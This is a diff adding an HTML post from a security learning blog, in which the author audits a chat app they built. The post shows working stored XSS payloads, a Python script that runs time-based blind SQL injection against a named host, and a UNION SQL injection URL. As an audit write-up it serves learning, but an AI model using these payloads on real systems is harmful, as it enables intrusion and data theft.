@@ -1,0 +1,346 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="dark">
+  <meta name="description" content="The Offsec Journal - My journey from a script kiddie to a security researcher">
+  <meta name="author" content="Aditya Bhardwaj">
+  
+  <title>The Offsec Journal</title>
+  
+  <link rel="stylesheet" href="/assets/css/pico.green.min.css">
+  <link rel="stylesheet" href="/assets/css/post.css">
+</head>
+
+<body>
+  <nav class="container">
+    <ul>
+      <li><strong>The Offsec Journal</strong></li>
+    </ul>
+    <ul>
+      <li><a href="/">Home</a></li>
+      <li><a href="/about.html">About</a></li>
+    </ul>
+  </nav>
+
+  <main class="container">
+    <article>
+      <!-- Post Header -->
+      <header>
+        <h1 id="bigtitle"></h1>
+        <div class="post-meta">
+          <time id="date"></time> 
+        </div>
+        <div id="tags"></div>
+      </header>
+    
+      <!-- Table of Contents -->
+      <aside class="toc">
+        <h3>Table of Contents</h3>
+        <ul id="toc_ul"></ul>
+      </aside>
+    
+      <!-- Introduction -->
+      <section>
+        <h2>Introduction</h2>
+
+        <p>Today's gonna be a fun day!</p>
+
+        <p>I'm digging into the image system today—the whole crappy little CDN I built (if you could call it that lol) in order to enable users to attach files to their messages. Only JPEGs and PNGs though!</p>
+
+        <p>Or so I thought back then, I guess.</p>
+
+        <p>I'm here to challenge that today—I'm gonna be ambitious and say that this image pipeline might be hiding our most severe findings yet.</p>
+
+        <p>Or, of course, the code might just be so incompetent that it saves itself by accident. Already happened once lol, let's see.</p>
+      </section><br>
+    
+      <!-- Planning -->
+      <section class="blog-section">
+        <h2 class="sectheading"></h2>
+        
+        <p>Ok, I thought we'd be dealing with four files in this one, but there are actually only two. There's a <code>/image.php</code>, <code>/api/image.php</code>, <code>/imageget.php</code> and finally <code>/api/imageget.php</code>, but it turns out that the files at <code>/</code> are quite literally the exact same as those in <code>/api</code>—zero diffs whatsoever. Nice! Makes my job easier.</p>
+
+        <p><code>image.php</code> is the file that inserts user images into the database; <code>imageget.php</code> is the one that retrieves them. We're dealing with the database again, so it's very possible that we find <i>even more</i> SQLi—but I'm more concerned at the fact that, if I don't have any input validation here either, we might be able to directly impact every damn user of the app.</p>
+
+        <p>If simply <i>existing</i> in a chatroom can expose each and every user to potentially-very-malicious files, then that's genuinely a big problem.</p>
+
+        <p>Let's start with <code>image.php</code>, see what kinda shenanigans we can get up to.</p>
+      </section><br>
+      
+      <!-- image.php -->
+      <section class="blog-section">
+        <h2 class="sectheading"></h2>
+                
+        <p>Ok, so here's the file I'm looking at right now:</p>
+        <pre><code>&lt;?php                                                                                                                 
+    require("./conn.php");
+    if ($_SERVER["REQUEST_METHOD"] === "POST") {
+        $data = json_decode(file_get_contents("php://input"), true);
+        
+        try {
+            $query = "INSERT INTO images(bin, data) VALUES('".$data["bin"]."', '".json_encode(array_diff_key($data, ["bin"=>""]))."')";    
+            if ($conn->query($query)) {echo $data["bin"];}
+        } catch (PDOException $error) {
+            die("A database error occurred: ".$error->getMessage());
+        }
+    }
+?&gt;</code></pre>
+
+        <p>First of all, what the hell is going on in that query?</p>
+
+        <pre><code>$query = "INSERT INTO images(bin, data) VALUES('".$data["bin"]."', '".json_encode(array_diff_key($data, ["bin"=>""]))."')";</code></pre>
+
+        <p>array_diff_key ??</p>
+
+        <p>Oh, what? 😭</p>
+
+        <p>Ok, so some context here—this is what the POST body would look like:</p>
+        <pre><code>{
+    prefix: "data:image/jpeg;base64,", // or whatever the image prefix was
+    data: "/9j/AAAABBBBCCCCDDDD...", // the base64 of the image (after we compress said image)
+    bin: 1785264727529 // the unix timestamp of whenever that img was uploaded, as a unique identifier
+}</code></pre>
+
+        <p>The whole <code>array_diff_key($data, ["bin"=>""])</code> thing is literally just saying "give me all of data, but remove the 'bin' key." A nice little <code>unset($data['bin'])</code> somewhere would've done the exact same thing lol. Nah, I had to be fancy with it, I guess.</p>
+
+        <p>Alright, so essentially the query is:</p>
+
+        <pre><code>INSERT INTO images(bin, data) VALUES(
+    '1785264727529', -- or whatever the timestamp was
+    '{"prefix": "data:image/jpeg;base64", "data": "/9j/AAAABBBBCCCCDDDD..." }'
+)</code></pre>
+
+        <p>I'm seeing something really really fun there! Once again, we control the POST body. And once again, there's not a LICK of input validation. We don't even need to make a file polyglot lol, we can straight up just hand it a whole data URL and it'll plug it in for us. Maybe even a PHP file—I don't know whether the PHP in there would be executed or not, but it's ABSOLUTELY worth a shot. I guess it just depends on how these images are being rendered in the rooms. Let's have a look at that logic real quick:</p>
+
+        <pre><code>window.onload = function() {
+    var l=document.getElementsByTagName("word")[0].innerHTML.split("&lt;br&gt;");l.forEach(e=>{isNaN(parseInt(e.split("|")[0]))||fetch("/imageget.php?bin="+e.split("|")[0]).then(e=>e.text()).then(t=>{document.getElementsByTagName("word")[0].innerHTML=document.getElementsByTagName("word")[0].innerHTML.replace(e.split("|")[0]+"|",`&lt;br&gt;&lt;img src="${t}"/&gt;&lt;br&gt;`)})});
+    document.body.scrollTop = document.body.scrollHeight;
+}</code></pre>
+
+        <p>Look, spaghetti! SO MUCH spaghetti!</p>
+
+        <p>I expanded it, here's what the relevant part actually looks like:</p>
+
+        <pre><code>// for context: a message with an image attached is sent in the format `bin|message content`
+// so like `1785264727529|hello there! this is a message!`
+
+fetch("/imageget.php?bin=" + /* the bin on this message */)
+    .then(e => e.text()).then(response => {
+        messagesElement = messagesElement.innerHTML.replace(/* the bin text */, `&lt;br&gt;&lt;img src="${response}"/&gt;&lt;br&gt;`)
+    })</code></pre>
+
+        <p>Ok, so it's literally just making a <code>&lt;img src="${response}"/&gt;</code>. Oh, and it's all within a string as well of course, so we can probably use our input to escape out of the <code>src</code> field, like if we insert quotes or something. Lemme actually try that real quick.</p>
+
+        <p>I've got the POST to <code>image.php</code> in Burp Repeater, let's see what I can do here. Here's my payload so far:</p>
+
+        <pre><code>{
+    "prefix": "https://google.com/favicon.ico", // doesnt matter, can be anything as long as it's a valid image url
+    "data": "\" onload=\"alert(1337)",
+    "bin":1234567890
+}</code></pre>
+
+        <p>So I can POST this now, and then, from a separate WebSocket connection, send a message that looks something like <code>1234567890|whatever message here</code>. Then, when someone joins the chatroom and they fetch all the messages, they'll pull the data from that "bin", and the JS will insert the following into their page:</p>
+
+        <pre><code>&lt;img src="https://google.com/favicon.ico" onload="alert(1337)"/&gt;</code></pre>
+
+        <p>Let's try.</p>
+
+        <video controls src="/assets/video/capstone/imgpipeline/1337xss.mp4"></video>
+
+        <p>AND WE GOT IT! YAY</p>
+        
+        <blockquote>Number of Findings Today: 1</blockquote>
+
+        <p>Using the trick we just found, since it's writing to the HTML directly, I bet we could just break out of the <code>&lt;img&gt;</code> tag entirely. Lemme try to inject an iframe with some js in it.</p>
+        <pre><code>{
+    "prefix": "anything",
+    "data": "\"&gt;&lt;iframe srcdoc=\"&lt;h1&gt;Hello from iframe!&lt;/h1&gt;&lt;br&gt;&lt;script&gt;document.body.innerHTML += `2 + 2 = ${2+2}`&lt;/script&gt;\"&gt;",
+    "bin":12345
+}</code></pre>
+
+        <p>So the iframe would look like:</p>
+        <pre><code>&lt;iframe srcdoc="
+    &lt;h1&gt;Hello from iframe!&lt;/h1&gt;
+    &lt;br&gt;
+    &lt;script&gt;document.body.innerHTML += `2 + 2 = ${2+2}`&lt;/script&gt;
+"&gt;</code></pre>
+
+        <p>Heh, nice!</p>
+
+        <video controls src="/assets/video/capstone/imgpipeline/iframexss.mp4"></video>
+
+        <p>Worked pretty damn good. The javascript does indeed execute.</p>
+
+        <p>One more thing here: if I remember correctly, the iframe inherits the parent's origin since it's using srcdoc, whereas just setting a src with a data URL will give it a different origin.</p>
+
+        <p>I edited the iframe so that it does this instead of the "2 + 2": <code>document.body.innerHTML += `my window.origin = ${window.origin}!`</code>. Here's what the payload looks like:</p>
+        <img src="/assets/img/capstone/imgpipeline/burp_iframe_no2.png">
+
+        <p>And here it is rendered (note: I deleted the first "2 + 2" iframe message from the db before sending this one in so that the chat window would look a little cleaner for the screenshot):</p>
+        <img src="/assets/img/capstone/imgpipeline/iframe_no2.png">
+
+        <p>Solid! It does indeed inherit the parent's origin. Good to know.</p>
+        
+        <p>Now, there's one more thing quite wrong here, which is that that db query isn't being prepared. Look:</p>
+        <pre><code>$query = "INSERT INTO images(bin, data) VALUES('".$data["bin"]."', '".json_encode(array_diff_key($data, ["bin"=>""]))."')"</code></pre>
+        
+        <p>So we can once again probably go time-based blind with that bin value since there's no input validation on that. I could probably take the script I wrote yesterday and fit it to this scenario. Gimme a sec.</p>
+
+        <p>Ok, something like this:</p>
+        <pre><code>import requests
+import string
+import time
+
+url = "https://parity.nimbusdigital.org/image.php"
+chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + "_.,-: ()+~"
+
+print("Starting...")
+
+result = ""
+pos = 1
+
+while True:
+    found = False
+
+    for c in chars:
+        bin = f"{time.time()}', (SELECT CASE WHEN substring(version(),{pos},1)='{c}' THEN pg_sleep(3) ELSE pg_sleep(0) END))--"
+        start = time.time()
+        requests.post(url, json={"prefix": "any", "data": "any", "bin": bin})
+
+        if (time.time() - start) >= 3: # over our time threshold; we got one
+            result += c
+            print(f"Char at position {pos} = '{c}' : {result}")
+            found = True
+            break
+
+    if not found:
+        break
+
+    pos += 1
+
+print(f"Done! Result: {result}")</code></pre>
+
+        <p>So the query would become:</p>
+        <pre><code>INSERT INTO images(bin, data) VALUES(/* current timestamp */, (SELECT CASE WHEN substring(version(),/* current pos */,1) = /* current char */ THEN pg_sleep(3) ELSE pg_sleep(0) END))</code></pre>
+
+        <p>Success! Check it out:</p>
+        <video controls src="/assets/video/capstone/imgpipeline/timeblind.mp4"></video>
+
+        <p>I left it running in the background, let it finish. It did it! Look:</p>
+        <img src="/assets/img/capstone/imgpipeline/timeblind.png">
+
+        <blockquote>Number of Findings Today: 2</blockquote>
+      </section><br>
+
+      <!-- imageget.php -->
+      <section class="blog-section">
+        <h2 class="sectheading"></h2>
+                
+        <p>Moving onto <code>imageget.php</code>, the complement to <code>image.php</code>. It's really quite a simple file—all it does is:</p>
+        <ul>
+            <li>Accepts a URL parameter <code>bin</code></li>
+            <li>Queries the database for the row <code>WHERE bin='".$_GET["bin"]."'"</code></li>
+            <li>Decodes the result as JSON and echoes the value of the <code>prefix</code> key concatenated to the value of the <code>data</code> key</li>
+        </ul>
+
+        <p>Of course it's SQLi-able. Of course. This one, in fact, may even be the most straightforward one yet! I say that because it's actually echoing out data from the query; if we can make the query itself return whatever we want, then we don't even need to go blind for this one!</p>
+
+        <p>That query looks like this:</p>
+        <pre><code>"SELECT * FROM images WHERE bin='".$_GET["bin"]."'"</code></pre>
+
+        <p>And the return logic looks like this:</p>
+        <pre><code>$dsrc = json_decode($src["data"], true); // where $src is the query result
+echo $dsrc["prefix"].$dsrc["data"];</code></pre>
+
+        <p>So, in theory, if we make that SELECT return a JSON string with keys for "prefix" and "data", the PHP file will echo their values.</p>
+        <p>Just googled how the hell to do that—apparently postgres has great JSON support right out of the box! There's a whole thing called <code>json_build_object('key1', 'val1', 'key2', 'val2')</code>. Love that!</p>
+        <p>Ok, so then I'm thinking something like:</p>
+
+        <pre><code>' UNION SELECT NULL, CAST(json_build_object('prefix', '', 'data', version()) AS text) --</code></pre>
+
+        <p>So the full query becomes:</p>
+        <pre><code>SELECT * FROM images WHERE bin='' UNION SELECT NULL, CAST(json_build_object('prefix', '', 'data', version()) AS text) --</code></pre>
+
+        <p>So ideally, this builds a JSON object with an empty "prefix" key and a "data" key that has literally anything we want inside of it, and then the PHP will just write that out for us.</p>
+        
+        <p>Let's try visiting:</p>
+        <pre><code>https://parity.nimbusdigital.org/imageget.php?bin=' UNION SELECT NULL, CAST(json_build_object('prefix', '', 'data', version()) AS text) --</code></pre>
+
+        <p>Would. You. Look. At. THAT.</p>
+        <img src="/assets/img/capstone/imgpipeline/getsqli.png">
+
+        <p>Absolutely gorgeous. This one takes the cake. Swap out that <code>version()</code> call for whatever you want, and it'll happily do it for you.</p>
+
+        <blockquote>Number of Findings Today: 3</blockquote>
+
+        <p>I'm not seeing anything else vulnerable in this file, because there isn't really anything else in this file at all lol. That was the main thing. Glad we got it—and first try, too!</p>
+      </section><br>
+
+      <!-- A Summary -->
+      <section class="blog-section">
+        <h2 class="sectheading"></h2>
+
+        <p>Well, well. Albeit shorter than the others, this was a pretty eventful session! Once again, here's what we found:</p>
+
+        <ul>
+            <li>Stored XSS in the main chatrooms due to lack of input validation in <code>image.php</code>.</li>
+            <li>Time-based Blind SQLi in <code>image.php</code> via the "bin" parameter, once again because of lack of input validation.</li>
+            <li>The best, plainest SQLi vuln yet, found in <code>imageget.php</code>, using the "bin" URL parameter.</li>
+        </ul>
+
+        <p>We didn't find any file polyglot crap like I thought from the beginning—but honestly, with the trick we found in <code>image.php</code>, it might not even be necessary. Because you can upload whatever the hell you want <i>anyway</i>—you don't need to trick the app into letting you. Makes things a lot easier on the attacker side lol, I'll take it.</p>
+
+        <p>I said earlier that I thought this session might be hiding our most severe findings yet—after the room-wide XSS, and that last SQLi in <code>imageget.php</code>, I think I was right.</p>
+
+        <p>That was <i>beautiful</i>.</p>
+
+        <p>Tomorrow's gonna be a big day: we'll finally be auditing the chatrooms themselves, in their entirety. Each one of those has like 10 files in it—that'll be interesting.</p>
+
+        <p>Stay tuned.</p>
+      </section><br>
+
+      <h3>Cheers!</h3>
+    </article>
+
+    <!-- Footer -->
+    <footer class="footer">
+      <p>
+        © 2025 ADITYA BHARDWAJ | <a href="mailto:adib334@outlook.com">Email</a>
+      </p>
+      <p><small>All writeups are for educational & documentation purposes only. Happy hacking!</small></p>
+    </footer>
+  </main>
+
+  <script>
+    const TITLE = "A Hell of an Image Pipeline";
+    const DATE = "2026-07-28";
+    const TAGS = ["Capstone", "Learning Journey", "PHP", "SQLi", "XSS"];
+    const SECTIONS = ["Planning", "image.php", "imageget.php", "A Summary"];
+    
+    
+    let tagsDiv = document.querySelector("div#tags"); let tocUl = document.querySelector("ul#toc_ul");
+    
+    if (SECTIONS.length) {
+      SECTIONS.forEach(section => {
+        tocUl.insertAdjacentHTML(
+          "beforeend",
+          `<li><a class="sectlink" href="#${section.toLowerCase().replace(/\s+/g, "_").replace(/\p{P}/gu, "")}">${section}</a></li>`
+        );
+      });
+    }
+
+    TAGS.forEach(tag => tagsDiv.innerHTML += `<span class="tag">${tag}</span>` );
+
+    document.querySelector("title").innerText = `The Offsec Journal | ${TITLE}`;
+    document.querySelector("h1#bigtitle").innerText = TITLE;
+    
+    document.querySelector("time#date").setAttribute("datetime", DATE);
+    document.querySelector("time#date").textContent = new Date(DATE).toLocaleString("en-US", { dateStyle: "long", timeZone: "UTC" });
+    
+    document.querySelectorAll("section.blog-section").forEach((s, i) => { if (SECTIONS[i]) s.id = SECTIONS[i].toLowerCase().replace(/\s+/g, "_").replace(/\p{P}/gu, "") });
+    document.querySelectorAll("h2.sectheading").forEach((s, i) => { if (SECTIONS[i]) s.innerText = SECTIONS[i] });
+  </script>
+</body>
+</html>
